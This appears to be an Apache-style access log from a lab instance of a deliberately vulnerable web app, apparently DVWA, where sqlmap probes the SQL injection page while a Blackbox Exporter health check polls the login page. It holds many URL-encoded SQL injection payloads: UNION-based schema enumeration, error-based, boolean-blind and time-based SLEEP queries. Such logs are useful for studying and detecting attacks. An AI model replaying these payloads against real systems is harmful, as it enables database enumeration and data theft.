192.168.178.133 - - [26/Apr/2025:09:43:06 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 1756 "http://192.168.178.152:8080/vulnerabilities/sqli/" "sqlmap/1.9.3#stable (https://sqlmap.org)"
172.18.0.3 - - [26/Apr/2025:09:43:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:43:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:43:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:43:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:43:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:43:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:43:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:43:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:44:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:44:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:44:20 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 1756 "http://192.168.178.152:8080/vulnerabilities/sqli/" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:44:24 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 1756 "http://192.168.178.152:8080/vulnerabilities/sqli/" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:44:27 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 1756 "http://192.168.178.152:8080/vulnerabilities/sqli/" "sqlmap/1.9.3#stable (https://sqlmap.org)"
172.18.0.3 - - [26/Apr/2025:09:44:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:44:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:44:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:44:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:44:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:44:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:45:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:46:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:46:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:46:14 +0000] "GET /vulnerabilities/search.php?q=test HTTP/1.1" 404 487 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:46:26 +0000] "GET /vulnerabilities/sqli/search.php?q=test HTTP/1.1" 404 492 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
172.18.0.3 - - [26/Apr/2025:09:46:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:46:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:46:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:46:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:46:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:46:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:47:06 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 448 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:08 +0000] "GET /login.php HTTP/1.1" 200 1097 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x716b717a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x726c7775756c%2CIFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a766271%29%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x716b717a71%2CIFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%2C0x716a766271%29%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x716b717a71%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x716a766271%29%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1011 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x716b717a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x726c7775756c%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%29%29%2C0x716a766271%29%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x716b717a71%2CIFNULL%28CAST%28COUNT%28schema_name%29%20AS%20CHAR%29%2C0x20%29%2C0x716a766271%29%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%201067%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x34%2C1024%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20iMPS&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%205390%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x32%2C512%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20NYtK&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%209231%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x36%2C256%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20fdwq&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1014 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%204186%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x38%2C128%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20ekBz&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1014 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%205464%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x34%2C64%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20gXqc&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%201542%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x32%2C32%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20vXFR&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1011 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%206113%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x36%2C16%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20eYGj&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%202861%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20REPEAT%280x38%2C8%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20mJLw&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%202184%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28SELECT%20IFNULL%28CAST%28COUNT%28schema_name%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20LtzQ&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E51--%20QOIJ&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E54--%20QOIJ&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1014 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E56--%20QOIJ&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E57--%20QOIJ&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1011 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1014 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1014 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%202242%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29tHip%29--%20uNEF&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%202242%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29tHip%29--%20uNEF&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%202242%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28DISTINCT%28schema_name%29%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29tHip%29--%20uNEF&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x716b717a71%2CIFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%2C0x716a766271%29%2CNULL--%20-&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1012 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%20%28SELECT%206121%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717a71%2C%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C0x716a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20ZJQC&Submit=Submit HTTP/1.1" 302 306 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
192.168.178.133 - - [26/Apr/2025:09:47:10 +0000] "GET /login.php HTTP/1.1" 200 1013 "-" "sqlmap/1.9.3#stable (https://sqlmap.org)"
172.18.0.3 - - [26/Apr/2025:09:47:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:47:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:47:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:47:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:47:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:47:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:47:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:47:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:48:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
                                                                                                                                                                                                                                     172.18.0.3 - - [27/Apr/2025:15:34:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:34:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
